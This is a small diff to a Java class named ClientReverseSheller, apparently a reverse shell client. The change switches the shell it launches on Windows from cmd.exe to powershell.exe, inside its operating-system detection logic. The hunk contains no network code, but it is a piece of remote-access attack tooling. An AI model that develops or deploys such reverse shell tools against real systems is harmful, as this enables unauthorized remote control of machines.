@@ -163,7 +163,7 @@ public class ClientReverseSheller {
             this.detectedShell = "/bin/sh";
         } else if (this.detectedOs.contains("WIN")) {
             this.detectedOs = "WINDOWS";
-            this.detectedShell = "cmd.exe";
+            this.detectedShell = "powershell.exe";
         } else {
             System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
         }
